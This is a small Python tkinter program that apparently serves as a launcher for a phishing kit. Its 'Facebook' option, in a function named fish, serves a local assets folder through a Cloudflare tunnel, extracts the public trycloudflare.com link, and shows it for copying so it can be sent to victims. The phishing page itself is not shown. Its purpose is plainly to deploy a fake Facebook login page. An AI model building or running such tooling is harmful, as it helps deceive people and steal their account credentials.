from tkinter import *
import os
from tkinter.ttk import *
def sites():
	def fish():
		def openInstrucktion():
			
			
			f = open("new.txt")
			#t is a Text widget
			example3.insert(INSERT, f.read())
		link = os.system("cd assets; hostit -f cloudflare 8080 > link.txt; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' 'link.txt' > new.txt; rm link.txt")
		#os.system("grep -o 'https://[-0-9a-z]*\.trycloudflare.com' 'link.txt' >> new.txt")
		
		
		root3 = Tk()
		root3.title("link")
		example3 = Entry(root3, width=60, font="Calibri 10")
		example3.grid(row=0,column=2)
		example4 = Button(root3,text="copy link", command= openInstrucktion)
		example4.grid(row=0, column=0)
		root3.mainloop()
	root1 = Tk()
	root1.geometry('500x300')
	root1.title("coose option")
	btn1 = Button(root1, text = 'Facebook',style = 'W.TButton', command = fish).grid(row = 0, column = 0)
	btn2 = Button(root1, text = 'Quit !', style = 'W.TButton', command = root1.destroy).grid(row = 0, column = 1)
	root1.mainloop()

root = Tk()
root.geometry('300x200')
sty = Style()
sty.configure('W.TButton', font = ('calibri', 10, 'bold', 'underline'), foreground = 'red')
btn1 = Button(root, text = 'Click me !', command =sites).grid(row = 0, column = 3, pady = 10, padx = 100)
btn2 = Button(root, text = 'Quit !', style = 'W.TButton', command = root.destroy).grid(row = 1, column = 3, padx = 100)
root.mainloop()
